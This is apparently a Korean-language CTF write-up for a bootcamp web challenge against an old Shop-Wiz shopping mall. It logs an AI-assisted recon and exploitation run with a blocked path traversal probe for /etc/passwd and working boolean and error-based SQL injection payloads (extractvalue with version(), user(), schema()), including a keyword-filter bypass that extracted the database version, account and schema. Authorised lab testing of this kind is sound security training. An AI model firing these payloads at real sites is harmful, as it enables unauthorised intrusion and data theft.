# CTF Report — bootcamp-ctf-web

## Executive Summary

대상은 `100.121.79.125`(Tailscale VPN, 부트캠프 CTF 배정 IP)에서 실행 중인 매우 오래된
스택(Apache/2.2.34, PHP/5.2.17) 위의 "숍위즈(Shop-Wiz)" 쇼핑몰 솔루션이다. 이번 문제는
Flag 제출이 아니라 취약점 발견이 목표였다. `lib/out.banner.php`의 `uid` 파라미터에서
**boolean-based / error-based SQL Injection(CWE-89)**을 확인했고, 서버가 MySQL 에러
메시지를 그대로 노출하는 취약점(CWE-209)과 결합해 `extractvalue()` error-based
기법으로 MySQL 버전(`5.1.73`), DB 접속 계정(`wizmall@172.18.0.3`), 스키마명(`wizmall`)을
실제로 추출했다(FACT, [evidence:EVID-EXPLOIT-006] [evidence:EVID-EXPLOIT-008]
[evidence:EVID-EXPLOIT-009]).

## Harness 구성

- `ctf/bootcamp-ctf-web/scope.md` — 허용 Target(`100.121.79.125`), CTF 승인 기록
  (부트캠프 CTF, 학생 본인 승인, 기존 `bootcamp-ctf-auth-login`과 동일 배정 IP의
  다른 문제), 목표는 Flag가 아닌 취약점 발견.
- 문제 배정("새 문제로 넘어가자")과 "진행해"(recon+exploit 포괄 승인)를 학생이
  직접 부여, 이후 recon/exploit Control들은 개별 GO 없이 연속 실행하고 로그로 기록.

## Recon

- FACT: `GET /` 응답에서 `Server: Apache/2.2.34 (Unix)`, `X-Powered-By: PHP/5.2.17`,
  타이틀 "숍위즈(Shop-Wiz)" 확인. [evidence:EVID-RECON-001]
- FACT: `wizmart.php`가 PHP Warning을 그대로 노출해 서버 절대경로
  (`/usr/local/apache2/htdocs/wizmart.php`)가 드러남. [evidence:EVID-RECON-002]
- FACT: `wizhtml.php?html=`의 path traversal/LFI 시도는 전부 동일한 차단 응답으로
  걸러짐(블랙리스트 필터로 추정). [evidence:EVID-RECON-003]
- FACT: `wizboard.php?BID=`는 화이트리스트/디렉터리 존재 검증이라 quote 삽입만으로는
  SQLi 증거가 나오지 않음. [evidence:EVID-RECON-004]
- FACT: `wizsearch.php?keyword=`는 `magic_quotes_gpc`류 이스케이프가 적용돼 있어
  문자열 quote 기반 SQLi가 직접 성립하지 않음. [evidence:EVID-RECON-005]
- 상세 근거는 `recon.md` 참고.

## 실행과 Evidence

| Control | 요청 | 결과 | Evidence |
| --- | --- | --- | --- |
| CTL-RECON-001 | GET / | 200, Apache 2.2.34/PHP 5.2.17/숍위즈 식별 | EVID-RECON-001 |
| CTL-RECON-003 | GET /wizmart.php?query=option&optionvalue=2 | 200, PHP Warning으로 서버 경로 노출 | EVID-RECON-002 |
| CTL-RECON-004 | GET /wizhtml.php?html=../../../../../../etc/passwd | 200, 차단 스크립트 응답 | EVID-RECON-003 |
| CTL-RECON-007 | GET /wizboard.php?BID=board01'&GID=root | 200, "폴더 없음" 차단 | EVID-RECON-004 |
| CTL-RECON-008 | GET /wizsearch.php?...&keyword=' | 200, `\'`로 이스케이프됨 | EVID-RECON-005 |
| CTL-EXPLOIT-001 | GET /lib/out.banner.php?uid=1 | 302, Location: / (baseline true) | EVID-EXPLOIT-001 |
| CTL-EXPLOIT-002 | GET /lib/out.banner.php?uid=99999 | 302, Location: (empty, baseline false) | EVID-EXPLOIT-002 |
| CTL-EXPLOIT-003 | GET /lib/out.banner.php?uid=1 AND 1=1 | 302, Location: / (참) | EVID-EXPLOIT-003 |
| CTL-EXPLOIT-004 | GET /lib/out.banner.php?uid=1 AND 1=2 | 302, Location: (empty, 거짓) | EVID-EXPLOIT-004 |
| CTL-EXPLOIT-005 | GET .../uid=1 AND SUBSTRING(VERSION(),1,1)=5 | 200, SQL 에러+쿼리 원문 노출, 필터로 깨짐 | EVID-EXPLOIT-005 |
| CTL-EXPLOIT-006 | GET .../uid=1 AND extractvalue(1,concat(0x7e,version())) | 200, MySQL 5.1.73 추출 | EVID-EXPLOIT-006 |
| CTL-EXPLOIT-007 | GET .../uid=1 AND updatexml(...,database()...) | 200, 필터로 깨짐(우회 실패) | EVID-EXPLOIT-007 |
| CTL-EXPLOIT-008 | GET .../uid=1 AND extractvalue(1,concat(0x7e,user())) | 200, wizmall@172.18.0.3 추출 | EVID-EXPLOIT-008 |
| CTL-EXPLOIT-009 | GET .../uid=1 AND extractvalue(1,concat(0x7e,schema())) | 200, 스키마 wizmall 추출(database() 필터 우회) | EVID-EXPLOIT-009 |

## AI 활용과 검증

- CVE/취약점 패턴 식별(오래된 PHP/Apache 스택 기반 취약점 가설), 엔드포인트 분류,
  boolean/error-based SQLi payload 초안은 AI(Claude)가 작성했다.
- 모든 요청은 실제로 실행됐고 응답(HTTP status, Location 헤더, 에러 메시지 본문)이
  Tool Observation으로 확보됐다 — AI의 해석(근본 원인, 필터 로직 추정)은 INFERENCE로
  구분해 `recon.md`/`finding-summary.md`에 표시했다.
- "진행해"라는 포괄 승인 이후 recon과 exploit(SQLi 확인) Control들은 개별 GO 없이
  연속 실행됐으며, Tailscale 연결 중단이 있었을 때는 즉시 중지하고 학생에게 상태를
  알린 뒤 재개했다.
- 회원 테이블 등 실제 Credential/개인정보에 해당할 데이터는 Scope의 금지 조항에
  따라 추가로 추출하지 않고 멈췄다 — AI는 이 지점에서 성공/실패나 추가 진행 여부를
  확정하지 않는다.

## 신뢰 근거와 Evidence Ref

- `evidence/index.json` — EVID-RECON-001~005, EVID-EXPLOIT-001~009 전부 등록,
  `report_eligible: true`
- `evidence/all-requests.md`, `evidence/all-results.md` — 보낸 요청/받은 결과 전문
- `evidence/finding-summary.md` — 요약본(대상, 근본 원인, 결과 표)

## 실패와 한계

- UNKNOWN: `wizhtml.php`의 정확한 필터 로직(블랙리스트 문자 목록)은 실제 소스코드를
  보지 않는 한 확정할 수 없다 — 지금까지 시도한 traversal 페이로드는 전부 막혔다.
- UNKNOWN: `wizboard.php`, `wizsearch.php`에 다른 형태(숫자형 파라미터, 헤더/쿠키
  기반 등)의 SQLi가 있는지는 추가 검증 전이다.
- UNKNOWN: 필터가 정확히 어떤 키워드 목록에 반응하는지(현재 확인된 것: `SUBSTRING`,
  `UPDATEXML`, `DATABASE`) 전수 조사하지 않았다 — 다른 위험 함수도 걸리는지 미확인.
- 실행 중 대상이 Tailscale에서 일시적으로 오프라인이 됐던 사건이 있었다 —
  우리 요청이 원인인지, 학생 측 머신의 다른 이유(수면 모드 등)인지는 확정되지 않았다
  (UNKNOWN).

## Harness 개선과 다음 Target

- Flag가 없는 "취약점 발견" 목표에도 기존 harness의 Recon/Exploit Control 로그,
  FACT/INFERENCE/UNKNOWN 구분, Evidence 파일 구조가 그대로 잘 맞았다.
- 다음 단계로 학생이 결정할 것: (1) 실제 회원 테이블 데이터 추출까지 진행할지
  (Credential 수집이라 별도 Scope 확장/GO 필요), (2) `wizhtml.php`/`wizboard.php`/
  `wizsearch.php`의 추가 취약점 조사를 계속할지, (3) 이 SQLi를 어떤 형태로
  보고서/제출물에 반영할지.
